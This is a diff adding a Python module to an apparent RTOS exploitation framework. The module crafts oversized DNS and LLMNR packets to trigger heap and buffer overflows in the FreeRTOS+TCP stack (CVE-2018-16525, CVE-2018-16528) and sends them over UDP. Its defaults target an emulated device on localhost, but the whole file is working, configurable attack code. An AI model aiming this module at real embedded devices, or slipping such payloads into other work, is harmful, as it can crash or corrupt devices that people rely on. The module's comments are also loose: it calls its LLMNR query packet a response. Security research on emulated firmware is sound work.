@@ -1,0 +1,126 @@
+"""FreeRTOS+TCP network stack vulnerability exploit module (CVE-2018-16525, CVE-2018-16528)."""
+
+from __future__ import annotations
+
+import socket
+import struct
+
+from rtosploit.scanners.base import ScannerModule, ScanOption, ScanResult
+
+
+class FreeRTOSTCPStack(ScannerModule):
+    name = "tcp_stack"
+    description = (
+        "FreeRTOS+TCP network stack vulnerabilities. Targets CVE-2018-16525 "
+        "(DNS response heap overflow) or CVE-2018-16528 (LLMNR response processing "
+        "buffer overflow). Sends crafted network packets to the emulated firmware."
+    )
+    authors = ["RTOSploit Contributors"]
+    references = [
+        "CVE-2018-16525",
+        "CVE-2018-16528",
+        "https://nvd.nist.gov/vuln/detail/CVE-2018-16525",
+        "https://nvd.nist.gov/vuln/detail/CVE-2018-16528",
+    ]
+    rtos = "freertos"
+    rtos_versions = ["*"]
+    architecture = "armv7m"
+    category = "heap_corruption"
+    reliability = "medium"
+    cve = None
+
+    def register_options(self):
+        self.add_option(ScanOption(
+            name="target_ip", type="str", required=False, default="127.0.0.1",
+            description="Target IP (QEMU user networking)"
+        ))
+        self.add_option(ScanOption(
+            name="target_port", type="int", required=False, default=5355,
+            description="Target port (5355=LLMNR, 53=DNS)"
+        ))
+        self.add_option(ScanOption(
+            name="name_length", type="int", required=False, default=256,
+            description="Length of overflow name field"
+        ))
+        self.add_option(ScanOption(
+            name="cve", type="str", required=False, default="CVE-2018-16525",
+            description="Which CVE to exploit: CVE-2018-16525 or CVE-2018-16528"
+        ))
+
+    def check(self, target) -> bool:
+        if not target.fingerprint or target.fingerprint.rtos_type != "freertos":
+            return False
+        data = target.firmware.data
+        return b"FreeRTOS+TCP" in data or b"FreeRTOS_IP" in data or b"xDNS" in data
+
+    def _build_cve_2018_16525_payload(self, name_length: int) -> bytes:
+        """Craft DNS response with oversized name to trigger heap overflow."""
+        # DNS response header
+        transaction_id = 0x1234
+        flags = 0x8180  # Standard response, no error
+        questions = 1
+        answers = 1
+        header = struct.pack("!HHHHHH", transaction_id, flags, questions, answers, 0, 0)
+        # Question section (query for "A")
+        query_name = b"\x04test\x03com\x00"
+        query_type = struct.pack("!HH", 1, 1)  # A record, IN class
+        # Answer section: name pointer + oversized rdata
+        answer_name = b"\xc0\x0c"  # pointer to query name
+        answer_type = struct.pack("!HHiH", 1, 1, 300, name_length)  # type A, 300s TTL, rdata_len
+        answer_data = b"\x41" * name_length  # overflow data
+        return header + query_name + query_type + answer_name + answer_type + answer_data
+
+    def _build_cve_2018_16528_payload(self, name_length: int) -> bytes:
+        """Craft LLMNR response with oversized name to trigger buffer overflow (CVE-2018-16528)."""
+        transaction_id = 0x1652
+        flags = 0x0000  # LLMNR query
+        questions = 1
+        header = struct.pack("!HHHHHH", transaction_id, flags, questions, 0, 0, 0)
+        # Name field longer than LLMNR_NAME_MAX_SIZE (typically 255)
+        name = b"\x00" + b"\x41" * name_length + b"\x00"
+        query_type = struct.pack("!HH", 28, 1)  # AAAA record, IN class
+        return header + name + query_type
+
+    def exploit(self, target, payload) -> ScanResult:
+        cve = self.get_option("cve")
+        target_ip = self.get_option("target_ip")
+        target_port = self.get_option("target_port")
+        name_length = self.get_option("name_length")
+        notes = [f"Targeting {cve} via UDP to {target_ip}:{target_port}"]
+
+        if cve == "CVE-2018-16525":
+            pkt = self._build_cve_2018_16525_payload(name_length)
+        else:
+            pkt = self._build_cve_2018_16528_payload(name_length)
+
+        notes.append(f"Crafted packet: {len(pkt)} bytes")
+        sent = False
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(2.0)
+            sock.sendto(pkt, (target_ip, target_port))
+            sock.close()
+            sent = True
+            notes.append(f"Packet sent successfully to {target_ip}:{target_port}")
+        except Exception as e:
+            notes.append(f"Could not send packet (QEMU not running?): {e}")
+
+        return ScanResult(
+            module="freertos/tcp_stack",
+            status="success" if sent else "failure",
+            target_rtos="freertos",
+            architecture="armv7m",
+            technique=f"network_overflow_{cve}",
+            payload_delivered=sent,
+            payload_type="network_packet",
+            achieved=["heap_corruption"] if sent else [],
+            registers_at_payload={},
+            notes=notes,
+            cve=cve,
+        )
+
+    def cleanup(self, target) -> None:
+        pass
+
+    def requirements(self) -> dict:
+        return {"qemu": True, "gdb": False, "network": True}
